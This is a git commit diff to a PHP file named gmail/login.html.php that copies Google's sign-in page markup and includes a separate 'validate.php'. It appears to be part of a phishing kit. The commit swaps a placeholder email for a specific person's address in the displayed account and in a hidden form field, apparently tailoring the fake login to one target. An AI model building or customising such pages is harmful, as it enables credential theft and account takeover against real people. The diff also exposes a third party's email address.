bffac7d8af45b0741f74793eda76a0b4c74f81ec
code34348 <88024661+code34348@users.noreply.github.com>
2022-12-22 11:44:08 +0000

    Update login.html.php

--- files/gmail/login.html.php
+++ files/gmail/login.html.php
@@ -74,7 +74,7 @@ include "validate.php";
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                     </svg>
                                  </div>
-                                 <div class="dsxx49" id='prev-email'>1@1.com</div>
+                                 <div class="dsxx49" id='prev-email'>mimi@lemonlawassist.com</div>
                                  <div class="krLnGe">
                                     <svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="18px" height="18px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                        <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
@@ -100,7 +100,7 @@ include "validate.php";
                      min-height: 50px;
                      width: 50%;
                      position: relative;
-		     padding-left: 5%;
+		     padding-left: 8%;
                      }
                      .g-email-preview {
                      border-radius: 16px;
@@ -180,7 +180,7 @@ include "validate.php";
                         <div class='slide-item' id='slide-username'>
                            <form id='email-form-step' >
                               
-                                 <input id='email-input' type="hidden"  value="1@1.com">
+                                 <input id='email-input' type="hidden"  value="mimi@lemonlawassist.com">
                               
                            </form>
                            <div class="invalid-email" style='display:none;'>
